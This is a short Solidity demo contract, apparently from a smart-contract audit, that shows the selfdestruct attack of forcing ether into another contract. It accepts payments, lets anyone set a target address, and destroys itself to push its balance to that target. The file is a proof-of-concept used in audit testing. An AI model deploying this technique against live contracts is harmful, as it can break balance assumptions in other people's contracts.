/**
 * Demo contract intended to invoke the selfdestruct
 * value transfer attack.
 * 
 * NOT PART OF AUDIT
 */
contract SelfDestructTransfer {
    address public owner;
    address public contractAddr;

    // accept payments
    function () payable {
    }

    function setReceiver(address _contract) {
        owner = msg.sender;
        contractAddr = _contract;
    }

    function destroy() {
        require(msg.sender == owner);
        selfdestruct(contractAddr);
    }
}